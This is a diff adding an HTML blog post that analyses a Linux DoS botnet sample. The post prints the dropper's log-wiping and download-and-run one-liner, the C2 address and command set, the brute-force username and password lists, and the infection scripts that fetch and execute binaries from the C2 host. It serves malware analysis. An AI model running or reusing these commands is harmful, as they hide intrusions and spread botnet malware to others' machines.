@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        
+        <title>b08f9dc5784532be5b3f695f37c7781b | Fakhri Zulkifli</title>
+        
+
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+        <!-- Begin Jekyll SEO tag v2.5.0 -->
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="b08f9dc5784532be5b3f695f37c7781b" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="b08f9dc5784532be5b3f695f37c7781b" />
+<meta property="og:description" content="b08f9dc5784532be5b3f695f37c7781b" />
+<link rel="canonical" href="http://localhost:4000/posts/2018/09/06/b08f9dc5784532be5b3f695f37c7781b/" />
+<meta property="og:url" content="http://localhost:4000/posts/2018/09/06/b08f9dc5784532be5b3f695f37c7781b/" />
+<meta property="og:site_name" content="Fakhri Zulkifli" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2018-09-06T00:00:00+08:00" />
+<script type="application/ld+json">
+{"description":"b08f9dc5784532be5b3f695f37c7781b","headline":"b08f9dc5784532be5b3f695f37c7781b","datePublished":"2018-09-06T00:00:00+08:00","dateModified":"2018-09-06T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2018/09/06/b08f9dc5784532be5b3f695f37c7781b/"},"@type":"BlogPosting","url":"http://localhost:4000/posts/2018/09/06/b08f9dc5784532be5b3f695f37c7781b/","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inconsolata|PT+Sans">
+        <link rel="stylesheet" href="https://unpkg.com/basscss@8.0.2/css/basscss.min.css">
+
+        <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
+    </head>
+
+    <body>
+        <div class="max-width-3 mx-auto">
+            <div class="clearfix">
+                <div class="col col-6">
+                    <h1>
+                        <a href="/" class="site-title">
+                            Fakhri Zulkifli
+                        </a>
+                    </h1>
+                </div>
+
+                <div class="col col-6">
+                    <ul class="list-reset right-align">
+                        
+                            <li class="inline-block mr1">
+                                <a href="/about" class="navigation-item">
+                                    about
+                                </a>
+                            </li>
+                        
+                            <li class="inline-block mr1">
+                                <a href="https://github.com/fakhrizulkifli" class="navigation-item">
+                                    github
+                                </a>
+                            </li>
+                        
+                            <li class="inline-block mr1">
+                                <a href="https://twitter.com/d0lph1n98" class="navigation-item">
+                                    twitter
+                                </a>
+                            </li>
+                        
+                    </ul>
+                </div>
+            </div>
+
+            <div class="border-top">
+                <div class="clearfix">
+    <div class="col col-6">
+        <h2>b08f9dc5784532be5b3f695f37c7781b</h2>
+    </div>
+    <div class="col col-6">
+        <p class="right-align">September 6, 2018</p>
+    </div>
+</div>
+
+<div class="clearfix">
+    <div class="col col-12">
+        <p>Initial file dropped:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>clear ; unset ; rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog /root/.bash_history ; unset HISTFILE ; unset HISTSAVE ; unset HISTLOG ; history -n ; unset WATCH ; export HISTFILE=/dev/null ; wget keedz.tk/client ; chmod +x client ; ./client ; rm -rf client ; rm -rf bash_history ; export HISTFILE=/dev/null ; rm -rf botz.sh ; exit
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">client</code> is a 64-bit ELF binary. The binary acts as a DoS bot which connect to their CNC (5.135.209.121) on port 23.</p>
+
+<p>Available commands:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GETLOCALIP
+SCANNER ON | OFF
+HOLD
+JUNK
+HTTP
+COMBO
+KILLATTK
+FUCKOFF
+</code></pre></div></div>
+
+<p>Below is the connection to the CNC:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying 5.135.209.121...
+Connected to ip121.ip-5-135-209.eu.
+Escape character is '^]'.
+!* SCANNER ON
+PING
+PONG
+</code></pre></div></div>
+
+<p>If you try to connect for the 2nd time, this will be output.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying 5.135.209.121...
+Connected to ip121.ip-5-135-209.eu.
+Escape character is '^]'.
+!* LOLNOGTFO
+Connection closed by foreign host.
+</code></pre></div></div>
+
+<p>However, the CNC can be connected again after a few seconds.</p>
+
+<p>The binary spread by bruteforcing the login for a random IP addresses.</p>
+
+<p>List of usernames:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root
+admin
+user
+login
+guest
+support
+</code></pre></div></div>
+<p>List of passwords:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root
+toor
+admin
+user
+guest
+login
+changeme
+1234
+12345
+123456
+default
+password
+support
+</code></pre></div></div>
+
+<p>Once logged in, it will execute the following commands:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 5.135.209.121 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 5.135.209.121; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 23 5.135.209.121 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+</code></pre></div></div>
+
+<p>Inside bins.sh, more binary will be fetch</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-e #!/bin/bash
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sshd; chmod +x sshd; ./sshd; rm -rf sshd
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/openssh; chmod +x openssh; ./openssh; rm -rf openssh
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bash; chmod +x bash; ./bash; rm -rf bash
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/tftp; chmod +x tftp; ./tftp; rm -rf tftp
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/wget; chmod +x wget; ./wget; rm -rf wget
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/cron; chmod +x cron; ./cron; rm -rf cron
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ftp; chmod +x ftp; ./ftp; rm -rf ftp
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/pftp; chmod +x pftp; ./pftp; rm -rf pftp
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sh; chmod +x sh; ./sh; rm -rf sh
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/' '; chmod +x ' '; ./' '; rm -rf ' '
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
+</code></pre></div></div>
+
+    </div>
+</div>
+
+            </div>
+        </div>
+    </body>
+</html>
